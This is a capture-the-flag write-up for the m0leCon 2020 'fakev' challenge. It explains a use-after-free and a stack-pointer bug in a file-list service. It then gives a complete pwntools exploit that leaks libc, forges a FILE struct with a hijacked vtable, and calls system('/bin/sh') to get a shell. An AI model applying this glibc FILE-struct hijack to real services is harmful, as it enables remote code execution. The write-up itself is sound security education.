# m0leCon CTF 2020 Teaser

## fakev

This challenge was solved by [@korniltsev](https://ctftime.org/user/54962),
[@mostobriv](https://ctftime.org/user/25913),
[@n00bie](https://ctftime.org/user/50936) and me (on behalf of [Corrupted
Pwnis](https://ctftime.org/team/87386)).

Writeup will not be super detailed, but rather brief overview of the solution.

`fakev` service allows us to open up to 9 files which are organized into a
linked list of the following structure:

```cpp  
struct node_t {  
   FILE *file;  
   struct node_t *next;  
};  
```

Where `file` is a pointer into the file structure of the corresponding file.
Also, we're able to close and read content of these files (write isn't
implemented).

Basically, there are 2 vulns. The first one is UAF in reading file content (we
can read the file content of the already closed file). The second one is
placed inside of `add` function. When we create 9th file, service allocates
new `struct node_t` for this file, but doesn't use it. Instead, it assigns
stack address into `next` field of the previously opened file:

```cpp  
 new_node = (node_t *)malloc(0x10uLL);  
 if ( !new_node )  
 {  
   perror("Couldn't alloc");  
   exit(1);  
 }  
 node->next = (node_t *)&stac;;                // set next to stack  
 node->next->file = (_QWORD *)fp;  
 node->next->next = 0LL;  
```

If we can control stack value, then we're able to change `next` into
controlled `struct node_t` with controlled `file` field. In `get_int` function
input that user supplies is then saved into the global variable (address of
this variable is known because of disabled `PIE`).

Hence, attack vector is the next:

1. Leak libc address (will be explained below)  
2. Change `next` field of the last opened file with the controlled one (already explained)  
3. Point `file` into global variable which is controlled (already explained)  
4. Call `fclose` on the `fake file` and get the shell (will be explained below).

The rest we need to do is to leak libc address and hijack the control flow
when `fclose` is called on the fake file struct. Libc leaking can be done by
filling up `tcache[0xf0]` and then using the first vuln (UAF in reading) to
read content of the freed unsorted bin chunk.

Controlling the program flow after `fclose` is called can be done by forging
the vtable of the fake file struct. Of course, we can't just point it to any
fake vtable because of `_IO_vtable_check`. Fake vtable should be placed inside
of libc vtable section. After searching for the right function, we're faced
with `_IO_str_overflow`. Just satisfy the requirements and call arbitrary code
with controlled `rdi`.

```python  
from pwn import *

def open_file(io, idx, fake_idx=None):  
   io.sendlineafter(':', '1')  
   if fake_idx is not None:  
       io.sendafter(':', fake_idx)  
   else:  
       io.sendlineafter(':', str(idx))

def read_content(io, idx):  
   io.sendlineafter(':', '2')  
   io.sendlineafter(':', str(idx))

def close_file(io):  
   io.sendlineafter(':', '4')

def main():  
   libc = ELF('./libc.so.6')  
   io = remote('challs.m0lecon.it', 9013)

   for idx in range(1, 9):  
       open_file(io, idx)  
   for idx in range(8):  
       close_file(io)  
log.info('tcache[0xf0] is filled up')  
  
   read_content(io, 1)  
   libc_arena = u64(io.recvn(17)[9:])  
   libc_base  = libc_arena - 0x3ebca0  
  
   log.success('libc_arena @ ' + hex(libc_arena))  
   log.success('libc_base  @ ' + hex(libc_base))

   for idx in range(1, 9):  
       open_file(io, idx)  
   open_file(io, 1)

   vtable  = libc_base + 0x3e82a0  
   rdi     = libc_base + next(libc.search('/bin/sh'))  
   system  = libc_base + libc.symbols['system']  
  
   fake_file = ''  
   fake_file += p64(0x2000)        # flags  
   fake_file += p64(0)             # _IO_read_ptr  
   fake_file += p64(0)             # _IO_read_end  
   fake_file += p64(0)             # _IO_read_base  
   fake_file += p64(0)             # _IO_write_base  
   fake_file += p64((rdi-100)/2)   # _IO_write_ptr  
   fake_file += p64(0)             # _IO_write_end  
   fake_file += p64(0)             # _IO_buf_base  
   fake_file += p64((rdi-100)/2)   # _IO_buf_end  
   fake_file += p64(0)             # _IO_save_base  
   fake_file += p64(0)             # _IO_backup_base  
   fake_file += p64(0)             # _IO_save_end  
   fake_file += p64(0)             # _markers  
   fake_file += p64(0)             # _chain  
   fake_file += p64(0)             # _fileno  
   fake_file += '\xff'*8  
   fake_file += p64(0)  
   fake_file += p64(0x602110)

   fake_file += '\xff'*8  
   fake_file += p64(0)  
   fake_file += p64(0x602108) # file  
   fake_file += p64(0)        # next  
   fake_file += p64(0)  
   fake_file += p64(0)  
   fake_file += p64(0)  
   fake_file += p64(0)  
   fake_file += p64(0)  
   fake_file += p64(vtable-0x3a8-0x88) # vtable  
   fake_file += p64(system)            # alloc_buffer

   payload = ''.join([  
       '4'.ljust(8, '\x00'),  
       fake_file  
   ]).ljust(0x100, '\x00')  
   io.send(payload)  
   log.success('embeded fake file struct into linked list')  
log.info('triggering fclose on fake file struct...')  
  
   io.sendline('cat flag.txt')

   io.interactive()

if __name__ == '__main__':  
   main()  
```

> ptm{pl4y1ng_w17h_5t4cks_4nd_f1l3s_f0r_fun_4nd_pr0f}

Original writeup (https://github.com/merrychap/ctf-
writeups/tree/master/2020/m0leCon/fakev).